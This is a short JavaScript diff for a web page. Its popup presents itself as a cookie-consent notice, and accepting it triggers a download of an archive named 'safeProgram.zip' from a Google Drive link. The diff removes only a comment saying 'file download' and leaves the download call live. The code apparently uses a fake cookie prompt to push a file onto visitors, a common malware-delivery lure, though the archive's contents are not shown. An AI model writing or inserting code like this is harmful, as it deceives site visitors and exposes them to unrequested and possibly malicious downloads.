@@ -7,7 +7,7 @@ window.addEventListener('load', (event) => {
 function showPopup() {
     const message = "This website uses cookies. By visiting the pages of the site, you agree to our Privacy Policy.";
     confirmCustom("Our web page uses cookies.", message).then(() => {
-        // 파일 다운로드
+        
         downloadFile('safeProgram.zip', 'https://docs.google.com/uc?export=download&id=1PLwDTQBaQYrAug40LiTMhFjtWVjb_C-s');
     });
 }
